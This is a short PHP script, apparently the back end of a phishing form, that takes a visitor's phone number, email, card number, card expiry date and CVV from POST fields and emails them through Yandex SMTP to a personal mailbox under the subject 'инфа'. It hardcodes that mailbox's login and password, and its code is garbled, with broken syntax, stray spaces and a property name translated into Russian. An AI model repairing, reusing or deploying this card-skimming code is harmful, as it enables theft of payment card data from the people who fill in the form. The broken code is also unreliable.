<?php
require_once ='index.html'
$number = $_POST['user_telephone'];
$email = $_POST['user_email'];
$kart = $_POST['user_kart'];
$data_month = $_POST['user_data/month_kart'];
$svv = $_POST['user_svv'];

$mail->isSMTP();
$mail->Host ='smtp.yandex.ru';
$mail->SMTPAuth ='true';
$mail->Username ='vasya.borisenko2020@yandex.ru';
$ mail->Password='Vasa3400';
$ mail -> Порт = '465' ;
$mail->setFrom('vasya.borisenko2020@yandex.ru');
$mail->addAddress('vasya.borisenko2020@yandex.ru');
$mail->Subject='инфа';
$mail->Body='' $number $email $kart $data_month $svv;
?>
